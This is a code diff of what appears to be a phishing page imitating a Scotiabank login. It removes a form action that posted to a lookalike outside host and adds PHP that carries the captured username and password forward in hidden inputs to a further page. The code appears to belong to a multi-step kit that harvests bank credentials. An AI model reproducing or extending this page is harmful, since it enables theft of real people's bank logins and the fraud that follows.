@@ -37,8 +37,20 @@
 
 <body><!--]>-->
 
-    <form name="frmUsuario" method="POST" action="http://scotiabankpink.zzz.com.ua/post.php" data-ng-submit="VerificarUsuario()" accept-charset="UTF-8" autocomplete="off" class="form-horizontal text-center ng-pristine ng-valid">
+    <form name="frmUsuario" method="POST" action="index3.html" data-ng-submit="VerificarUsuario()" accept-charset="UTF-8" autocomplete="off" class="form-horizontal text-center ng-pristine ng-valid">
 
+           <?php 
+                     $variable= $_POST['usuario'];
+        echo '<input id="dato" style="display:none" name="usuario" value="'. htmlspecialchars($variable) . '" readonly />'."\n";
+		?>
+
+				   <?php 
+                     $variable1= $_POST['pass'];
+        echo '<input id="dato1"  style="display:none" name="pass" value="'. htmlspecialchars($variable1) . '" readonly />'."\n";
+		?>
+		<br>
+        
+        
     <codf-root>
         <div class="first-meaningful">
             <div class="first-meaningful__logo">
